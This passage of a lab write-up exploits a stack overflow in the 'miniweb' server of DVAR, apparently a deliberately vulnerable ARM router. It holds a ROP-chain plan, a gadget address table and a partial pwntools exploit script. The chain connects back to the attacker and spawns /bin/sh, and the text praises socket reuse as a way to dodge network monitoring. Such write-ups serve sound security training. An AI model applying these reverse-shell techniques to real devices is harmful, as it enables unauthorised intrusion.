+</span></span></code></pre></div><p><img alt="crash with cyclic" src="/img/dvar/crash-with-cyclic.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x6461616a</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">336</span>
+</span></span></code></pre></div><p>So we know how far is the return address from our buffer start. Now, we need to retrieve useful gadgets and functions in the binary and shared libraries shipped in rootfs. These gadgets should allow us to spawn a shell, typically by calling <code>system</code> function or <code>exec*</code> like syscalls.</p>
+<p>One remaining issue is that the process (<code>/bin/sh</code>) would have its file descriptors inherited from its father, and in our case it means we won&rsquo;t be able to interact with the spawned shell.</p>
+<p>To tamper with this, we could write a ROP-chain that achieves a complete reverse shell onto attacker machine, or just <code>dup2</code> the already opened client socket file descriptor to overwrite <code>STDIN</code>, <code>STDOUT</code>, <code>STDERR</code>. The ROP-chain would finally performs following calls:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">// in case of complete reverse shell,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// we prepend following code to ROP-chain
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>csock <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">connect</span>(csock, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sin, <span style="color:#66d9ef">sizeof</span>(sin));   <span style="color:#75715e">// where sin is written on stack
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                                        <span style="color:#75715e">// and contains data for connecting 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                                        <span style="color:#75715e">// to attacker
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// base ROP-chain
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">dup2</span>(csock, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">dup2</span>(csock, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">dup2</span>(csock, <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span></code></pre></div><p>Using the already allocated socket would be very cool. <strong>It allows stealthy exploitation by using an already allocated connection, which has been created by a normal behavior of the server</strong>. It would have been stealthier than creating a new socket, which can be seen with tools like <code>ss</code>, or even be trapped by software monitoring network connections.</p>
+<p>What harden the difficulty for exploiting this way is the unpredictability of the <code>csock</code> file descriptor. Indeed, <code>accept</code> could have been called many times before we try to exploit and if for some reason file descriptors hasn&rsquo;t been released by the kernel, then we would not be able to predict <code>csock</code> value.</p>
+<p>Plan:</p>
+<ol>
+<li>set <code>r0</code> to <code>2</code></li>
+<li>set <code>r1</code> to <code>1</code></li>
+<li>set <code>r2</code> to <code>0</code></li>
+<li><strong>call <code>socket</code></strong></li>
+<li>save <code>r0</code> value somewhere</li>
+<li>set <code>r0</code> to <code>csock</code> (result of socket is already in <code>r0</code>, so nothing to do)</li>
+<li>set <code>r1</code> to <code>sin</code> (located inside function frame)</li>
+<li>set <code>r2</code> to <code>16</code> (equals to <code>sizeof(struct sockaddr_in)</code>)</li>
+<li><strong>call <code>connect</code></strong></li>
+<li>set <code>r0</code> to <code>csock</code></li>
+<li>set <code>r1</code> to <code>0</code></li>
+<li><strong>call <code>dup2</code></strong></li>
+<li>set <code>r0</code> to <code>csock</code></li>
+<li>set <code>r1</code> to <code>1</code></li>
+<li><strong>call <code>dup2</code></strong></li>
+<li>set <code>r0</code> to <code>csock</code></li>
+<li>set <code>r1</code> to <code>2</code></li>
+<li><strong>call <code>dup2</code></strong></li>
+<li>set <code>r0</code> to <code>&quot;/bin/sh&quot;</code></li>
+<li><strong>call <code>system</code></strong></li>
+</ol>
+<table>
+  <thead>
+      <tr>
+          <th>step</th>
+          <th>description</th>
+          <th>gadget</th>
+          <th>file offset</th>
+          <th>virtual address</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>1</code></td>
+          <td>set <code>r0</code> to <code>2</code></td>
+          <td><code>mov r0, #0 ; pop {r7, pc}</code>, <code>add r0, r0, #2 ; pop {r4, pc}</code></td>
+          <td><code>0x0000eef0</code>, <code>0x000300f4</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>2</code></td>
+          <td>set <code>r1</code> to <code>1</code></td>
+          <td><code>mov r1, #0 ; mov r0, r1 ; pop {r4, r5, r6, pc}</code>, <code>add r1, r1, #1 ; cmp r0, #0 ; bne #0x30578 ; pop {r4, pc}</code></td>
+          <td><code>0x0003a6d8</code>, <code>0x000305a8</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>3</code></td>
+          <td>set <code>r2</code> to <code>0</code></td>
+          <td><code>mov r2, #0 ; str r2, [r3] ; pop {r4, pc}</code></td>
+          <td><code>0x00030d30</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>5</code></td>
+          <td>save <code>r0</code> value somewhere</td>
+          <td><code>pop {r4, pc}</code>, <code>str r0, [r4] ; pop {r4, pc}</code></td>
+          <td><code>0x0000bac4</code>, <code>0x0002ae30</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>6</code></td>
+          <td>set <code>r0</code> to <code>csock</code></td>
+          <td>nothing to do</td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>7</code></td>
+          <td>set <code>r1</code> to <code>sin</code></td>
+          <td><code>pop {r1, r2, r3, pc}</code></td>
+          <td><code>0x000129e4</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>8</code></td>
+          <td>set <code>r2</code> to <code>16</code></td>
+          <td><code>pop {r1, r2, r3, pc}</code>, <code>add r2, r2, #1 ; str r2, [r0, #0x50] ; mov r0, r3 ; pop {r4, pc}</code></td>
+          <td><code>0x000129e4</code>, <code>0x00029110</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>10</code></td>
+          <td>set <code>r0</code> to <code>csock</code></td>
+          <td><code>pop {r4, pc}</code>, <code>ldr r0, [r4] ; pop {r4, r5, r6, pc}</code></td>
+          <td><code>0x0000bac4</code>, <code>0x0001b714</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>11</code></td>
+          <td>set <code>r1</code> to <code>0</code></td>
+          <td><code>mov r1, #0 ; mov r0, r1 ; pop {r4, r5, r6, pc}</code></td>
+          <td><code>0x0003a6d8</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>10</code></td>
+          <td>set <code>r0</code> to <code>csock</code></td>
+          <td><code>pop {r4, pc}</code>, <code>ldr r0, [r4] ; pop {r4, r5, r6, pc}</code></td>
+          <td><code>0x0000bac4</code>, <code>0x0001b714</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>14</code></td>
+          <td>set <code>r1</code> to <code>1</code></td>
+          <td><code>mov r1, #0 ; mov r0, r1 ; pop {r4, r5, r6, pc}</code></td>
+          <td><code>0x0003a6d8</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>10</code></td>
+          <td>set <code>r0</code> to <code>csock</code></td>
+          <td><code>pop {r4, pc}</code>, <code>ldr r0, [r4] ; pop {r4, r5, r6, pc}</code></td>
+          <td><code>0x0000bac4</code>, <code>0x0001b714</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>17</code></td>
+          <td>set <code>r1</code> to <code>2</code></td>
+          <td><code>mov r1, #0 ; mov r0, r1 ; pop {r4, r5, r6, pc}</code></td>
+          <td><code>0x0003a6d8</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td><code>19</code></td>
+          <td>set <code>r0</code> to <code>&quot;/bin/sh&quot;</code></td>
+          <td><code>pop {r4, pc}</code>, <code>mov r0, r4 ; pop {r4, pc}</code></td>
+          <td><code>0x0000bac4</code>, <code>0x00015ed8</code></td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<p>Additional gadgets:</p>
+<ul>
+<li><code>0x00016298 : pop {r3, pc}</code></li>
+</ul>
+<p>We need:</p>
+<ul>
+<li>address of <code>&quot;/bin/sh&quot;</code> string =&gt; <code>0xff77d080</code></li>
+<li>address of <code>system</code> function (or PLT trampoline) =&gt; <code>0x10ca8</code></li>
+<li>address of a gadget allowing to set <code>r0</code> to <code>&quot;/bin/sh&quot;</code> string (typically one writing r0 with a value from stack)
+<ul>
+<li><code>0x00015ed8 : mov r0, r4 ; pop {r4, pc}</code> =&gt; <code>0xff74ced8</code></li>
+<li><code>0x0000bac4 : pop {r4, pc}</code> =&gt; <code>0xff742ac4</code></li>
+</ul>
+</li>
+<li>address of gadgets allowing to exec <code>dup2(csock, 0); dup2(csock, 1); dup2(csock, 2)</code>
+<ul>
+<li><code>0x0000eef0 : mov r0, #0 ; pop {r7, pc}</code> =&gt; <code>0xff745ef0</code></li>
+<li><code>0x000305a8 : add r1, r1, #1 ; cmp r0, #0 ; bne #0x30578 ; pop {r4, pc}</code> =&gt; <code>0xff7675a8</code>
+<ul>
+<li>usefull to increment r1 to reach <code>csock</code></li>
+</ul>
+</li>
+<li><code>0x0001f500 : mov r0, #1 ; pop {r4, pc}</code> =&gt; <code>0xff756500</code></li>
+<li><code>0x00030b48 : add r1, r1, #1 ; bne #0x30b08 ; pop {r4, r5, pc}</code> =&gt; <code>0xff767b48</code>
+<ul>
+<li>usefull to increment r1 to reach <code>csock</code> (when <code>r0=1</code>)</li>
+</ul>
+</li>
+<li><code>0x000129e4 : pop {r1, r2, r3, pc}</code> =&gt; <code>0xff7499e4</code></li>
+<li><code>0x000300f4 : add r0, r0, #2 ; pop {r4, pc}</code> =&gt; <code>0xff7670f4</code></li>
+<li><code>0x00030d30 : mov r2, #0 ; str r2, [r3] ; pop {r4, pc}</code> =&gt; <code>0xff767d30</code></li>
+</ul>
+</li>
+</ul>
+<p>Our payload is prepended by <code>&quot;Connection from %s, request = \&quot;GET </code>, where the string format <code>%s</code> is replaced with the remote IP (<code>172.17.0.1</code>), and with a timestamp if we have to use the upper stack buffer for overflowing the stack (in case we send too much bytes).</p>
+<p>Exploit with following script in local:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote_plus <span style="color:#66d9ef">as</span> urlencode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;arm&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>bits <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>endian <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;little&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Base address</span>
+</span></span><span style="display:flex;"><span>base_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xff737000</span> <span style="color:#75715e"># (local) 0x40000000  # 0xff737000 </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Calculating virtual addresses</span>
+</span></span><span style="display:flex;"><span>g_pop_r4_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000bac4</span>  <span style="color:#75715e"># null</span>
+</span></span><span style="display:flex;"><span>g_mov_r0_r4_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00015ed8</span>
+</span></span><span style="display:flex;"><span>g_ldr_r0_r4_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0001b714</span>
+</span></span><span style="display:flex;"><span>g_mov_r0_0_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000eef0</span> <span style="color:#75715e"># null </span>
+</span></span><span style="display:flex;"><span>g_pop_r1_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000129e4</span>
+</span></span><span style="display:flex;"><span>g_add_r0_2_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000300f4</span> <span style="color:#75715e"># null</span>
+</span></span><span style="display:flex;"><span>g_add_r1_1_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00030b48</span>
+</span></span><span style="display:flex;"><span>g_add_r1_1_with_cmp_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000305a8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>g_mov_r1_0_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0003a6d8</span>
+</span></span><span style="display:flex;"><span>g_add_r1_1_with_r0_cmp_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000305a8</span>
+</span></span><span style="display:flex;"><span>g_add_r0_2_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000300f4</span>
+</span></span><span style="display:flex;"><span>g_mov_r2_0_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00030d30</span>
+</span></span><span style="display:flex;"><span>g_str_r0_r4_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0002ae30</span>
+</span></span><span style="display:flex;"><span>g_pop_r4_r6_r7_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0001f3d8</span> 
+</span></span><span style="display:flex;"><span>g_pop_r1_r2_r3_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000129e4</span>
+</span></span><span style="display:flex;"><span>g_pop_r3_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00016298</span>
+</span></span><span style="display:flex;"><span>g_add_r2_1_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00029110</span>
+</span></span><span style="display:flex;"><span>g_strb_r0_r4_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0003a4a4</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dup2_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xb328</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#75715e"># +4 to skip PUSH {R7, LR} # null</span>
+</span></span><span style="display:flex;"><span>binsh_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x46080</span> 
+</span></span><span style="display:flex;"><span>system_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x438dc</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> 
+</span></span><span style="display:flex;"><span>socket_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3a240</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> 
+</span></span><span style="display:flex;"><span>connect_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x39bd8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>exit_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f2dc</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>execve_stub_ea <span style="color:#f92672">=</span> base_address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x43584</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>stack_buf_data_start <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffeae10</span>
+</span></span><span style="display:flex;"><span>stack_sin_ea <span style="color:#f92672">=</span> stack_buf_data_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>   <span style="color:#75715e"># 0xfffeae20</span>
+</span></span><span style="display:flex;"><span>stack_dummy_ea <span style="color:#f92672">=</span> stack_buf_data_start 
+</span></span><span style="display:flex;"><span>stack_csock_ea <span style="color:#f92672">=</span> stack_buf_data_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;192.168.100.2&#39;</span>, <span style="color:#ae81ff">80</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_host</span>(host):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        ip, port <span style="color:#f92672">=</span> host<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> argparse<span style="color:#f92672">.</span>ArgumentTypeError(<span style="color:#e6db74">&#34;host must be in format &lt;ip&gt;:&lt;port&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (ip, int(port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_null_bytes</span>(data):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">from</span> termcolor <span style="color:#f92672">import</span> colored
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;payload contains null bytes&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[payload]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ff&#39;</span> <span style="color:#f92672">+</span> data<span style="color:#f92672">.</span>hex()
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># chunk by byte (2 characters) and iterate</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(payload), <span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> (i <span style="color:#f92672">%</span> (<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                print()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> payload[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;00&#39;</span>:
+</span></span><span style="display:flex;"><span>                print(colored(payload[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#39;red&#39;</span>), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                print(payload[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>        print()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_send_delayed_routine</span>(p, data, delay<span style="color:#f92672">=</span><span style="color:#ae81ff">1.0</span>):
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(delay)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Sending </span><span style="color:#e6db74">{</span>len(data)<span style="color:#e6db74">}</span><span style="color:#e6db74"> bytes&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_delayed</span>(p, data, delay<span style="color:#f92672">=</span><span style="color:#ae81ff">1.0</span>):
+</span></span><span style="display:flex;"><span>    thread <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>_send_delayed_routine, args<span style="color:#f92672">=</span>(p,data, delay,))
+</span></span><span style="display:flex;"><span>    thread<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> thread
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Exploit for DVAR&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    subparsers <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;command&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    miniweb_parser <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#34;miniweb&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Run miniweb&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-H&#34;</span>, <span style="color:#e6db74">&#34;--host&#34;</span>, type<span style="color:#f92672">=</span>parse_host, default<span style="color:#f92672">=</span>HOST, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Target host (format = &lt;ip&gt;:&lt;port&gt;)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-l&#34;</span>, <span style="color:#e6db74">&#34;--listen&#34;</span>, type<span style="color:#f92672">=</span>int, default<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Port to listen on for reverse shell connection&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host[<span style="color:#ae81ff">0</span>], args<span style="color:#f92672">.</span>host[<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;miniweb&#34;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        variables <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_pop_r4&#34;</span>: g_pop_r4_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_mov_r0_r4&#34;</span>: g_mov_r0_r4_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_ldr_r0_r4&#34;</span>: g_ldr_r0_r4_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_mov_r0_0&#34;</span>: g_mov_r0_0_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_pop_r1&#34;</span>: g_pop_r1_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_add_r0_2&#34;</span>: g_add_r0_2_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_add_r1_1&#34;</span>: g_add_r1_1_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_add_r1_1_with_cmp&#34;</span>: g_add_r1_1_with_cmp_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_mov_r1_0&#34;</span>: g_mov_r1_0_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_add_r1_1_with_r0_cmp&#34;</span>: g_add_r1_1_with_r0_cmp_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_mov_r2_0&#34;</span>: g_mov_r2_0_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_str_r0_r4&#34;</span>: g_str_r0_r4_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_pop_r1_r2_r3&#34;</span>: g_pop_r1_r2_r3_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_pop_r3&#34;</span>: g_pop_r3_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_add_r2_1&#34;</span>: g_add_r2_1_ea,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;g_strb_r0_r4&#34;</span>: g_strb_r0_r4_ea
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[gadgets]&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> name, virt_addr <span style="color:#f92672">in</span> variables<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74"> = </span><span style="color:#e6db74">{</span>hex(virt_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">{</span>hex(virt_addr <span style="color:#f92672">-</span> base_address)<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;[variables]&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@dummy = &#39;</span>, hex(stack_dummy_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@csock = &#39;</span>, hex(stack_csock_ea))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;@sin =   &#39;</span>, hex(stack_sin_ea))
+</span></span><span style="display:flex;"><span>    
